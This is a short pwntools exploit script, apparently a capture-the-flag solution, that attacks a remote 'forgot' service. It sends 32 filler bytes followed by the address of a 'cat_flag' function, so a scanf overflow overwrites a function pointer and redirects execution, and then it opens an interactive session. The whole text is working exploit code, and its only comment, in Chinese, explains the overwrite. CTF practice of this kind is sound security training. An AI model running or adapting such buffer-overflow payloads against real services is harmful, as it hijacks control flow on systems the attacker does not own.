from pwn import *
context.log_level = 'debug'
# sh = process("./forgot")
sh = remote("61.147.171.105", 64040)
cat_flag = 0x080486CC
# 让V5 = 1, 执行V3[0], scanf可以覆盖到V3[0]
payload = b'A'*32 + p32(cat_flag)
sh.recvuntil("> ")
sh.sendline(b'aaa')
sh.recvuntil("> ")
sh.sendline(payload)
sh.interactive()